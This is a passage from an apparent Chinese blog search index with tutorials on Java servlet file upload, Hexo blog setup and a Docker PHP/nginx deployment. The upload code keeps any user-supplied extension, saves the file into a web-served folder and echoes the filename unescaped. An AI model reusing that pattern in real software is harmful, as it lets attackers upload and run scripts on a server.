1); if (filename.indexOf(&quot;.&quot;) &gt;= 0) &#123; // 就截取.之前的字符串 int indexdot = filename.indexOf(&quot;.&quot;); suffix = filename.substring(indexdot); fName = filename.substring(0, filename.lastIndexOf(&quot;.&quot;)); Date now = new Date(); fName = fName + &quot;_&quot; + now.getTime(); fName = fName + suffix; &#125; OutputStream out = new FileOutputStream(new File(path,fName)); request.setAttribute(name, fName); InputStream in = item.getInputStream(); int length = 0; byte[] buf = new byte[1024]; System.out.println(&quot;获取上传文件的总共的容量：&quot; + item.getSize()); // in.read(buf) 每次读到的数据存放在 buf 数组中 while ((length = in.read(buf)) != -1) &#123; // 在 buf 数组中 取出数据 写到 （输出流）磁盘上 out.write(buf, 0, length); &#125; in.close(); out.close(); &#125; &#125; &#125; catch (FileUploadException e) &#123; e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; request.getRequestDispatcher(&quot;filedemo.jsp&quot;).forward(request, response);&#125; public void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException &#123; doGet(request, response); &#125;&#125; 编辑Jsp文件1.在WebRoot下创建一个filedemo.jsp文件 2.编辑index.jsp页面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%String path = request.getContextPath();String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;%&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt; &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt; &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt; &lt;!-- &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt; --&gt; &lt;/head&gt; &lt;script src=&quot;../js/jquery-3.1.1.min.js&quot;&gt;&lt;/script&gt; &lt;body&gt; &lt;form action=&quot;fileUpload&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt; 图片名称:&lt;input type=&quot;text&quot; name=&quot;usename&quot;&gt; &lt;br /&gt; 上传图片:&lt;input type=&quot;file&quot; id=&quot;file0&quot; name=&quot;file1&quot;&gt;&lt;br /&gt; &lt;img src=&quot;&quot; id=&quot;img0&quot;&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;script&gt; (&quot;#file0&quot;).change(function()&#123; var objUrl = getObjectURL(this.files[0]); console.log(&quot;objUrl = &quot; + objUrl); if(objUrl)&#123;(&quot;#file0&quot;).attr(&quot;src&quot;, objUrl)&#125;&#125;); function getObjectURL(file) &#123; var url = null; if (window.createObjectURL != undefined) &#123; // basic url = window.createObjectURL(file); &#125; else if (window.URL != undefined) &#123; // mozilla(firefox) url = window.URL.createObjectURL(file); &#125; else if (window.webkitURL != undefined) &#123; // webkit or chrome url = window.webkitURL.createObjectURL(file); &#125; return url; &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; Tipa:enctype=”multipart/form-data” 必须写在form表单内 3.回到filedemo.jsp页面进行最后的编辑 1234567891011121314151617181920212223242526272829&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%String path = request.getContextPath();String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;%&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt; &lt;title&gt;显示图片&lt;/title&gt; &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt; &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt; &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt; &lt;!-- &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt; --&gt; &lt;/head&gt; &lt;body&gt;&lt;!-- 用户名称:requestScope.usename&lt;br/&gt; --&gt;&lt;!-- 图片名称:&#123;requestScope.file1&#125;&lt;br/&gt; --&gt;&lt;%-- 文件名称:$&#123;requestScope.file2&#125;&lt;br/&gt; --%&gt; &lt;!-- 把上传的图片显示出来 --&gt;&lt;img alt=&quot;go&quot; src=&quot;upload/&lt;%=(String) request.getAttribute(&quot;file1&quot;)%&gt; &quot; style=&quot;width:500px;height:500px;&quot;/&gt; &lt;/body&gt;&lt;/html&gt; 快去试试吧 需要commons-fileupload-1.3.3.jarcommons-io-2.6.jarjquery-3.1.1.min.js这些文件欢迎在下方留言","categories":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/tags/Java/"},{"name":"Jsp","slug":"Jsp","permalink":"https://www.5658.pw/tags/Jsp/"}]},{"title":"hexo 创建文章、标签、分类","slug":"hexo-创建文章、标签、分类","date":"2018-10-04T12:50:47.000Z","updated":"2018-10-04T13:48:21.631Z","comments":true,"path":"2018/10/04/hexo-创建文章、标签、分类/","link":"","permalink":"https://www.5658.pw/2018/10/04/hexo-创建文章、标签、分类/","excerpt":"One、创建文章1.在博客根目录创建一个新文章 heox new “文章名称”","text":"One、创建文章1.在博客根目录创建一个新文章 heox new “文章名称” 生产后会提示你文件路径，一般在根目录/source/_posts下 2.文章基本写法 12345678910---title: Python识别验证码date: 2018-10-04 20:50:47comments: true #是否可评论toc: true #是否显示文章目录categories: Python #分类tags: #标签 - Python - AI--- Tips:头部千万别写错了 例如title前面不能加空格正确的: title: Python识别验证码 错误的: title: Python识别验证码 其他也是这样的哦 不然无法显示 Two、创建标签1.创建标签页面 hexo new page tags 2.基本设置 123title: tagsdate: 2018-10-04 20:50:47type: &quot;tags&quot; Tips:双引号加不加都可以。 Three、创建分类1.创建分类页面 hexo new page categories 2.基本设置 123title: categoriesdate: 2018-10-04 20:50:47type: &quot;categories&quot;","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/tags/Hexo/"}]},{"title":"Hexo添加搜索功能","slug":"Hexo","date":"2018-10-04T10:35:01.000Z","updated":"2018-10-04T12:43:29.402Z","comments":true,"path":"2018/10/04/Hexo/","link":"","permalink":"https://www.5658.pw/2018/10/04/Hexo/","excerpt":"1.安装在博客根目录打开打开Git Bash Here 输入命令 npm install hexo-generator-searchdb –save","text":"1.安装在博客根目录打开打开Git Bash Here 输入命令 npm install hexo-generator-searchdb –save 修改站点配置文件打开根目录下的_config.yml文件，进行编辑。 12345search: path: search.xml field: post format: html limit: 10000 Tips:每个冒号后面都有空格。 修改主题配置文件在/themes/next下编辑_config.yml我用的是Sublime Text编辑的 12local_search: enable: true Tips:每个冒号后面都有空格。 Ctrl+S保存 回到博客根目录打开Git Bash Here 输入命令 Hexo g -d进行编译上传 打开网页就可以看到搜索功能了，容易添加，使用起来很方便，推荐添加，增加网站友好度。","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/tags/Hexo/"}]},{"title":"继老博客常用功能","slug":"继老博客常用功能","date":"2018-10-02T05:59:47.000Z","updated":"2018-10-16T13:12:56.378Z","comments":true,"path":"2018/10/02/继老博客常用功能/","link":"","permalink":"https://www.5658.pw/2018/10/02/继老博客常用功能/","excerpt":"关于老版本博客上大家常用的功能我也会移上来的","text":"关于老版本博客上大家常用的功能我也会移上来的 功能曼茶罗&nbsp;&nbsp;&nbsp;捕鱼达人&nbsp;&nbsp;&nbsp;云视频&nbsp;&nbsp;&nbsp;飞机大战&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;花式扑克&nbsp;&nbsp;&nbsp;滑稽狗炫酷的键盘&nbsp;&nbsp;&nbsp;弹射烟花&nbsp;&nbsp;&nbsp;炫酷的光效&nbsp;&nbsp;&nbsp;炫酷的粒子&nbsp;&nbsp;&nbsp;一起挖矿吧","categories":[{"name":"博客","slug":"博客","permalink":"https://www.5658.pw/categories/博客/"}],"tags":[{"name":"娱乐","slug":"娱乐","permalink":"https://www.5658.pw/tags/娱乐/"}]},{"title":"Hexo搭建博客","slug":"Hexo搭建博客","date":"2018-10-02T05:30:39.000Z","updated":"2018-11-05T09:58:08.204Z","comments":true,"path":"2018/10/02/Hexo搭建博客/","link":"","permalink":"https://www.5658.pw/2018/10/02/Hexo搭建博客/","excerpt":"前言 这两天空间快到期了,也一直考虑是否继续坚持下去,加上老版本的博客看起来娱乐性比较大,也一直考虑博客的改版。","text":"前言 这两天空间快到期了,也一直考虑是否继续坚持下去,加上老版本的博客看起来娱乐性比较大,也一直考虑博客的改版。 正文这几天,一直在找合适的模板,期初打算用cms 但是cms收费的太贵,免费的又怕漏洞太多,直接pass掉;后来朋友推荐用WordPress,但感觉搭建完后模板都是死的,虽然可以自定义但修改起来特别麻烦,我用腾讯云2H2G的服务器搭建完后用手机和电脑访问试了下,访问速度特别卡,更别说香港共享10M的空间了。直到在网上看到Hexo,看完Hexo的主题后和简介,就打算要用Hexo搭建此博客了。 学习Hexo不到一星期,感觉不是很难,只是有点麻烦而已。Hexo,让我们一起坚持吧。","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/tags/Hexo/"},{"name":"博客","slug":"博客","permalink":"https://www.5658.pw/tags/博客/"}]},{"title":"Docker 部署PHP+ nginx环境","slug":"docker-部署PHP-nginx环境","date":"2018-05-11T05:12:34.000Z","updated":"2019-05-11T05:57:29.802Z","comments":true,"path":"2018/05/11/docker-部署PHP-nginx环境/","link":"","permalink":"https://www.5658.pw/2018/05/11/docker-部署PHP-nginx环境/","excerpt":"首先push 两个镜像 12docker pull php:7.2.3-fpmdocker pull nginx 然后启动一个php","text":"首先push 两个镜像 12docker pull php:7.2.3-fpmdocker pull nginx 然后启动一个php 1docker run --name phpfpm -d -v /root/app:/app php:7.2.3-fpm 说明一下 –name 是容器的名字 phpfpm -v 是/root/app 是本机的地址 /app 是容器内部的存储位置 然后再启动一个nginx 1docker run --name nginx_server -d -p 80:80 --link phpfpm:phpfpm -v /root/conf/nginx.conf:/etc/nginx/nginx.conf --volumes-from phpfpm nginx — link phpfrpm:phpfpm 是容器之间建立关系 –volumes-from phpfpm 就是把/root/app:/app 也会导入到 容器中/app 目录 -v /root/conf/nginx.conf 导入到 /etc/nginx/nginx.conf 宿主机 的nginx.conf 的导入到/etc/nginx/nginx.conf 中 连接PHP的配置如下： 1234567location ~ .php$ &#123;root /app;fastcgi_pass phpfpm:9000;fastcgi_index index.php;fastcgi_param SCRIPT_FILENAME /app$fastcgi_script_name;include fastcgi_params;&#125; nginx配置文件如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273user root root;worker_processes auto;error_log /tmp/nginx_error.log crit;pid /tmp/nginx.pid;worker_rlimit_nofile 51200;events &#123; use epoll; worker_connections 51200; multi_accept on; &#125;http &#123; include mime.types; default_type application/octet-stream; server_names_hash_bucket_size 512; client_header_buffer_size 32k; large_client_header_buffers 4 32k; client_max_body_size 50m; sendfile on; tcp_nopush on; keepalive_timeout 60; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 256k; fastcgi_intercept_errors on;server &#123; listen 80; server_name www.bt.cn; index index.html index.htm index.php; root /app; #error_page 404 /404.html; location ~ .php$ &#123; root /app; fastcgi_pass phpfpm:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /app$fastcgi_script_name; include fastcgi_params; &#125; location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; &#125; location ~ .*\\.(js|css)?$ &#123; expires 12h; &#125; location ~ /\\. &#123; deny all; &#125; access_log /tmp/access.log; &#125;&#125; 访问80端口如下：","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.5658.pw/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.5658.pw/tags/Docker/"},{"name":"PHP","slug":"PHP","permalink":"https://www.5658.pw/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.5658.pw/tags/Nginx/"},{"name":"运维","slug":"运维","permalink":"https://www.5658.pw/tags/运维/"},{"name":"WEB","slug":"WEB","permalink":"https://www.5658.pw/tags/WEB/"}]}]}